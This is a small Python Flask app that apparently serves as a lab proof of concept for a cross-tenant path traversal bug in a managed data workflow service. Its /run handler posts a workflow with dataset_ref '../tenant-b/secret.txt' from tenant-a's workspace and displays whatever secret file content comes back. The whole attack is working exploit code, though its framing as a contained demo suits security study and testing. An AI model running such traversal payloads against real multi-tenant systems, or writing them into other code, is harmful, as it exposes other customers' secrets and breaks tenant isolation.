"""Cross-tenant path traversal in a managed data service."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
API = os.environ.get("API_URL", "http://dataform-api:5000")

HTML = """<h1>Managed Data Workflows — Cross-Tenant Path Traversal</h1>
<form method="post" action="/run"><button>Run</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    log = []
    docs = requests.get(f"{API}/", timeout=8).json()
    log.append(f"[1] {docs['service']} -- all tenants execute on a shared worker")
    r = requests.post(f"{API}/workflows",
                      json={"workspace": "tenant-a", "dataset_ref": "../tenant-b/secret.txt"},
                      timeout=10)
    log.append(f"[2] dataset_ref=../tenant-b/secret.txt -> {r.text}")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
